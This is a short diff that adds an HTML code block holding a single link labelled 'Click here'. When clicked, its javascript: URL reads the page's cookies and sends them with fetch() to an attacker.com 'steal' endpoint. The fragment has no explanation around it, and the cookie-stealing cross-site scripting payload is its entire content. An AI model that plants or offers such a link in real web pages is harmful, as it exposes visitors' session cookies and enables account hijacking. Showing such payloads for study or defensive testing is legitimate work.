@@ -1,0 +1,3 @@
+```html
+<a href="javascript:fetch('https://attacker.com/steal?cookie=' + document.cookie)">Click here</a>
+```
